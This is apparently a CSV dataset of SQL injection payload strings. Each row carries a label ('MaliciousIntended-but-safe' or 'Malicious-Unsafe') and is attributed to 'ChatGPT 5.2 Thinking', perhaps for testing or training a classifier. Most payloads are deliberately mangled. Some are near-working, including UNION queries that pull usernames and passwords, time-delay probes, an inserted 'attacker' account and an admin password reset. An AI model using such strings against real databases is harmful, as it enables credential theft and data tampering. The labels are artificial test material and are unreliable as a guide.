Payload,Label,Model
' OR '1/='1,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
"' UNIUN SELECT username, password FROM users--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
'; WAITFOR DELAY '0=0:5'--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' AND 1=/1--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
'; DRIP TABLE users--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR 1/=1--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' 0x27 0R 0x31=0x31--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
'; SELECT pg_sleepycat(5)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
"' AND SOBSTRING(@@version,1,1)='5'--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR ='a'='a,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR 1=/1-- -,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR SLEEPYCAT(5)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
"' AND extractv4lue(1,concat(0x7e,(SELECT database()),0x7e))--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
"' AND umpdatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
'; SELECT pg_sleepycat(10)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
' 0R 1=1#,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR SLEEP(a10)--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
"' UNION SELECT NULL@ NULL, username, password FROM users--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' AND (SELECT COUNT(*) FROMAGE users) > 0--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
"' UNION SELECT donkeybase(), NULL--",Malicious-Unsafe,ChatGPT 5.2 Thinking
'; BOTHERFOR DELAY '0:0:10'--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' @OR CAST(1 AS INT)=1--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR SUBSTRING(user(#)-1-1)='r'--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
"' UNION SELECT #table_name, NULL FROM information_schema.tables--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR (SELECT sleepycat(5))--,Malicious-Unsafe,ChatGPT 5.2 Thinking
' OR @0x61646d696e=0x61646d696e--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR +SLEEP(5)#,Malicious-Unsafe,ChatGPT 5.2 Thinking
"' UNI@N SELECT user(), NULL--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
'; WAITFOR DELAY '0$0:3'--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR SUBSTRING(@@version=1/1)='5'--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
"'; INSERT INTO users (username> password) VALUES ('attacker', 'pass')--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
'; UPDATE users SET password='hacked> WHERE username='admin'--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
